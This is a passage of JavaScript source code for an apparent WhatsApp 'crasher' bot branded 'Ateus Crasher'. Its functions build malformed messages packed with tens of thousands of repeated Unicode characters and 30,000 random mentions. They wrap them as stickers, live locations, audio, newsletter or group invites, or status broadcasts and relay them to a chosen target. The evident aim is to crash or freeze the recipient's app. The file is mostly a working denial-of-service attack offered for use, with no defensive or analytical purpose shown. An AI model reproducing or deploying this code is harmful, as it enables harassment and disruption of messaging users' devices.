              liveLocationMessage: {
                degreesLatitude: " A t e u s  C r a s h e r ",
                degreesLongitude: " I love You - Hanzz ",
                caption: "Hanzz V1.5" + "\u0000" + "ꦾ".repeat(90000),
                sequenceNumber: "0",
                jpegThumbnail: "",
              },
            },
          },
        }),
        { userJid: target, quoted: qchanel }
      );

      await ctx.relayMessage(target, etc.message, {
        participant: { jid: target },
      });
      console.log(chalk.blue.bold("A t e u s  C r a s h e r"));
    } 
  
async function AteusHere(sock, target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 30000 }, () => Math.floor(Math.random() * 100000) + "@s.whatsapp.net")
            ]
          },
          stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });
}

async function AteusGod(sock, target, Ptcp = true) {
  let virtex = "*馃└ 饾悜蜖饾悽袒饾惓廷饾惐童饾悤袒饾悶蜏饾惀袒饾惓汀 饾悗蜖饾悷袒饾悷廷饾悽蜏饾悳童饾悽袒饾悮袒饾惀-饾悎童饾悆廷*" + "軎�".repeat(77777) + "@1".repeat(77777);
  var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: `120363319314627296@newsletter`,
          newsletterName: virtex,
          jpegThumbnail: "",
          caption: virtex,
          inviteExpiration: Date.now() + 1814400000
        },
        contextInfo: {
          mentionedJid: ["13135550002@s.whatsapp.net"],
          groupMentions: [
            {
              groupJid: `120363319314627296@newsletter`,
              groupSubject: virtex
            }
          ]
        }
      }
    }
  }), {
    userJid: target
  });

  await sock.relayMessage(target, messageContent.message, {
    participant: { jid: target },
    messageId: messageContent.key.id
  });
}

async function invisbug(sock, target, mention) { const generateMessage = { viewOnceMessage: { message: { audioMessage: { url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true", mimetype: "audio/mpeg", fileSha256: Buffer.from([ 226, 213, 217, 102, 205, 126, 232, 145, 0,  70, 137,  73, 190, 145,   0,  44, 165, 102, 153, 233, 111, 114,  69,  10, 55,  61, 186, 131, 245, 153,  93, 211 ]), fileLength: 432722, seconds: 26, ptt: false, mediaKey: Buffer.from([ 182, 141, 235, 167, 91, 254,  75, 254, 190, 229,  25,  16, 78,  48,  98, 117, 42,  71,  65, 199, 10, 164,  16,  57, 189, 229,  54,  93, 69,   6, 212, 145 ]), fileEncSha256: Buffer.from([ 29,  27, 247, 158, 114,  50, 140,  73, 40, 108,  77, 206,   2,  12,  84, 131, 54,  42,  63,  11,  46, 208, 136, 131, 224,  87,  18, 220, 254, 211,  83, 153 ]), directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0", mediaKeyTimestamp: 1746275400, contextInfo: { mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 7000000) + "@s.whatsapp.net"), isSampled: true, participant: target, remoteJid: "status@broadcast", forwardingScore: 9741, isForwarded: true } } } } };

const msg = generateWAMessageFromContent(target, generateMessage, {});

await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
        {
            tag: "meta",
            attrs: {},
            content: [
                {
                    tag: "mentioned_users",
                    attrs: {},
                    content: [
                        {
                            tag: "to",
                            attrs: { jid: target },
                            content: undefined
                        }
                    ]
                }
            ]
        }
    ]
});

if (mention) {
    await sock.relayMessage(
        target,
        {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        },
        {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "X" },
                    content: undefined
                }
            ]
        }
    );
}

}

async function kenalateusgak(sock, target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                liveLocationMessage: {
                    degreesLatitude: -9.09999262999,
                    degreesLongitude: 199.99963118999,
                    caption: "馃└ 饾悜蜖饾悽袒饾惓廷饾惐童饾悤袒饾悶蜏饾惀袒饾惓汀 饾悗蜖饾悷袒饾悷廷饾悽蜏饾悳童饾悽袒饾悮袒饾惀-饾悎童饾悆" + "饝噦饝喌饝喆饝喛".repeat(10000),
                    sequenceNumber: '0',
                    jpegThumbnail: '',
                contextInfo: {
                    mentionedJid: Array.from({
                        length: 30000
                    }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                    isSampled: true,
                    participant: target,
                    remoteJid: "status@broadcast",
                    forwardingScore: 9741,
                    isForwarded: true
                }
            }
        }
    }
};

const msg = generateWAMessageFromContent(target, generateMessage, {});

await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
                tag: "to",
                attrs: {
                    jid: target
                },
                content: undefined
            }]
        }]
    }]
});
}    

async function AteusCrash(sock, target) {
const msg = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "974197419741",
      inviteExpiration: "97419741",
      groupName: "鈳�" + "釤勧煗".repeat(10000),
      caption: "馃└ 饾悜蜖饾悽袒饾惓廷饾惐童饾悤袒饾悶蜏饾惀袒饾惓汀 饾悗蜖饾悷袒饾悷廷饾悽蜏饾悳童饾悽袒饾悮袒饾惀-饾悎童饾悆" + "釤勧煗".repeat(10000),
      jpegThumbnail: null
    }
  };
  await sock.relayMessage(target, msg, {
  participant: { jid: target }, 
  messageId: null
  })
}
//END FUNCTION//

// --- Jalankan Bot ---
 
(async () => {
    console.clear();
    console.log("⟐ Memulai sesi WhatsApp...");
    startSesi();

    console.log("Sukses Connected");
    bot.launch();

    // Membersihkan konsol sebelum menampilkan pesan sukses
    console.clear();
    console.log(chalk.bold.white(`\n
⣿⣿⣷⡁⢆⠈⠕⢕⢂⢕⢂⢕⢂⢔⢂⢕⢄⠂⣂⠂⠆⢂⢕⢂⢕⢂⢕⢂⢕⢂
⣿⣿⣿⡷⠊⡢⡹⣦⡑⢂⢕⢂⢕⢂⢕⢂⠕⠔⠌⠝⠛⠶⠶⢶⣦⣄⢂⢕⢂⢕
⣿⣿⠏⣠⣾⣦⡐⢌⢿⣷⣦⣅⡑⠕⠡⠐⢿⠿⣛⠟⠛⠛⠛⠛⠡⢷⡈⢂⢕⢂
⠟⣡⣾⣿⣿⣿⣿⣦⣑⠝⢿⣿⣿⣿⣿⣿⡵⢁⣤⣶⣶⣿⢿⢿⢿⡟⢻⣤⢑⢂
⣾⣿⣿⡿⢟⣛⣻⣿⣿⣿⣦⣬⣙⣻⣿⣿⣷⣿⣿⢟⢝⢕⢕⢕⢕⢽⣿⣿⣷⣔
⣿⣿⠵⠚⠉⢀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⢕⢕⢕⢕⢕⢕⣽⣿⣿⣿⣿
⢷⣂⣠⣴⣾⡿⡿⡻⡻⣿⣿⣴⣿⣿⣿⣿⣿⣿⣷⣵⣵⣵⣷⣿⣿⣿⣿⣿⣿⡿
⢌⠻⣿⡿⡫⡪⡪⡪⡪⣺⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃
⠣⡁⠹⡪⡪⡪⡪⣪⣾⣿⣿⣿⣿⠋⠐⢉⢍⢄⢌⠻⣿⣿⣿⣿⣿⣿⣿⣿⠏⠈
⡣⡘⢄⠙⣾⣾⣾⣿⣿⣿⣿⣿⣿⡀⢐⢕⢕⢕⢕⢕⡘⣿⣿⣿⣿⣿⣿⠏⠠⠈
⠌⢊⢂⢣⠹⣿⣿⣿⣿⣿⣿⣿⣿⣧⢐⢕⢕⢕⢕⢕⢅⣿⣿⣿⣿⡿⢋⢜⠠⠈
⠄⠁⠕⢝⡢⠈⠻⣿⣿⣿⣿⣿⣿⣿⣷⣕⣑⣑⣑⣵⣿⣿⣿⡿⢋⢔⢕⣿⠠⠈
⠨⡂⡀⢑⢕⡅⠂⠄⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⢔⢕⢕⣿⣿⠠⠈
⠄⠪⣂⠁⢕⠆⠄⠂⠄⠁⡀⠂⡀⠄⢈⠉⢍⢛⢛⢛⢋⢔⢕⢕⢕⣽⣿⣿⠠⠈
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`));
    console.log(chalk.bold.white("alwayshanzz"));
    console.log(chalk.bold.white("DEVELOPER:") + chalk.bold.blue("alwayshanzz"));
    console.log(chalk.bold.white("VERSION:") + chalk.bold.blue("1.0\n\n"));
    console.log(chalk.bold.green("©A T E U S C R A S H E R"));
})();